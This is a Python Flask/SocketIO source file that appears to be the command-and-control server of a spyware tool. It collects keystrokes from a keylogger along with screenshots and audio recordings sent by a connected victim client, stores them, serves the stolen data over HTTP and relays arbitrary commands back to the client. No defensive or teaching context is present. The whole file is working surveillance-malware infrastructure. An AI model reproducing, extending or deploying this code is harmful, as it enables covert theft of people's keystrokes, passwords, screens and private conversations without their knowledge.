
from flask import Flask, render_template, request, send_from_directory
from flask_socketio import SocketIO, emit
import base64, os, datetime

app = Flask(__name__)
socketio = SocketIO(app)
UPLOAD_FOLDER = 'received_files'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

client_sid = None
keylog_data = ""

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_connect():
    global client_sid
    client_sid = request.sid
    print(f'Client connected: {client_sid}')

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Client disconnected: {request.sid}')

@socketio.on('keylog_data')
def handle_keylog(data):
    global keylog_data
    keylog_data += data
    print(f"Received keys: {data}")

@socketio.on('screenshot')
def handle_screenshot(data):
    filename = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.png"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    with open(filepath, "wb") as f:
        f.write(base64.b64decode(data))
    print(f"Screenshot saved as {filename}")

@socketio.on('audio')
def handle_audio(data):
    filename = f"audio_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.wav"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    with open(filepath, "wb") as f:
        f.write(base64.b64decode(data))
    print(f"Audio saved as {filename}")

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route('/get_keylogs')
def get_keylogs():
    return keylog_data.replace("\n", "<br>")

def send_command(event):
    if client_sid:
        socketio.emit(event, room=client_sid)

@app.route('/command/<cmd>')
def command(cmd):
    send_command(cmd)
    return f"Command {cmd} sent."

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)
